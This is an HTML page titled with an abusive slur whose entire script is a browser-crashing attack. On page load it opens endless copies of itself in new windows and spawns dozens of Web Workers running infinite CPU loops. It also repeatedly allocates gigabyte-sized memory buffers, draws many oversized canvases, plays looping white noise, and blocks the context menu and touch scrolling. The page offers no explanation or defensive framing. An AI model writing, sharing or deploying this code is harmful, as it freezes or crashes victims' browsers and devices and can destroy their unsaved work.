<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>BYE BITCH</title>
  <style>
    body {
      margin: 0;
      height: 100dvh;
      background: #000;
      color: #f33;
      font-family: system-ui, sans-serif;
      overflow: hidden;
      display: grid;
      place-items: center;
      font-size: 26vw;
      font-weight: 900;
      text-shadow: 0 0 150px #f00;
      user-select: none;
    }
    canvas { position: fixed; inset: 0; z-index: -1; }
    .chaos { position: fixed; pointer-events: none; z-index: 5; mix-blend-mode: screen; filter: contrast(300%) brightness(200%); }
  </style>
</head>
<body>
<div>BYE BITCH</div>

<script>
const nukelink = location.href;
function openNuke() {
  try {
    window.open(nukelink, '_blank');
    const a = document.createElement('a');
    a.href = nukelink; a.target = '_blank';
    document.body.appendChild(a); a.click(); a.remove();
  } catch(e) {}
}
for (let i = 0; i < 200; i++) setTimeout(openNuke, i * 1);
setInterval(() => { for (let i = 0; i < 60; i++) setTimeout(openNuke, i * 3); }, 30);

setInterval(() => { for (let i = 0; i < 15000; i++) document.title = Math.random().toString(36) + "💀🔥☠️"; }, 1);

const workerCode = URL.createObjectURL(new Blob([`
  'use strict';
  self.onmessage = () => {
    let x = performance.now() * Math.PI;
    while (true) {
      x = Math.sin(x) * Math.cos(x * 1.8) * Math.tan(x + 1e-9) * Math.sqrt(Math.abs(x));
      for (let i = 0; i < 250000000; i++) {
        x += Math.log1p(Math.abs(x) + 1e-300) * 7e-9;
      }
    }
  };
`], { type: 'application/javascript' }));

const threadCount = (navigator.hardwareConcurrency || 8) * 30;
for (let i = 0; i < threadCount; i++) new Worker(workerCode).postMessage("go");

const allocations = [];
function bombMemory() {
  try {
    allocations.push(new ArrayBuffer(1 << 30));
    allocations.push(new Float64Array(1 << 28).fill(Math.random()));
    allocations.push(new Uint8Array(1 << 29));
  } catch(e) {}
}
for (let i = 0; i < 400; i++) bombMemory();
setInterval(bombMemory, 30);

for (let n = 0; n < 50; n++) {
  const c = document.createElement('canvas');
  c.style.position = 'fixed';
  c.style.inset = '0';
  c.style.zIndex = '-1';
  c.style.opacity = '0.55';
  document.body.appendChild(c);

  const ctx = c.getContext('2d');

  function resize() {
    c.width = innerWidth * 5;
    c.height = innerHeight * 5;
  }
  resize();
  window.addEventListener('resize', resize);

  let t = n * 15;
  function draw() {
    ctx.fillStyle = 'rgba(0,0,0,0.05)';
    ctx.fillRect(0, 0, c.width, c.height);

    for (let i = 0; i < 2800; i++) {
      const x = Math.sin(t * 0.08 + i) * c.width * 0.62 + c.width/2;
      const y = Math.cos(t * 0.07 + i * 2.5) * c.height * 0.62 + c.height/2;
      ctx.fillStyle = `hsl(${ (t*100 + i*25) % 360 }, 100%, 85%)`;
      ctx.fillRect(x-35, y-35, 70, 70);
    }
    t += 0.75;
    requestAnimationFrame(draw);
  }
  draw();
}

for (let i = 0; i < 120; i++) {
  const el = document.createElement('div');
  el.className = 'chaos';
  el.textContent = "CRASH";
  el.style.fontSize = (150 + Math.random() * 800) + "px";
  el.style.left = Math.random() * 100 + "vw";
  el.style.top = Math.random() * 100 + "vh";
  el.style.transform = `rotate(${Math.random()*5000}deg)`;
  el.style.animation = `spin ${0.3 + Math.random()*0.8}s linear infinite`;
  document.body.appendChild(el);
}

const style = document.createElement('style');
style.innerHTML = `@keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }`;
document.head.appendChild(style);

try {
  const audio = new (window.AudioContext || window.webkitAudioContext)();
  const noise = audio.createBufferSource();
  const buffer = audio.createBuffer(1, audio.sampleRate * 10, audio.sampleRate);
  const data = buffer.getChannelData(0);
  for (let i = 0; i < data.length; i++) data[i] = Math.random() * 2 - 1;
  noise.buffer = buffer;
  noise.loop = true;
  noise.connect(audio.destination);
  noise.start();
} catch(e) {}

document.addEventListener('contextmenu', e => e.preventDefault());
document.addEventListener('touchmove', e => e.preventDefault(), {passive: false});
</script>
</body>
</html>
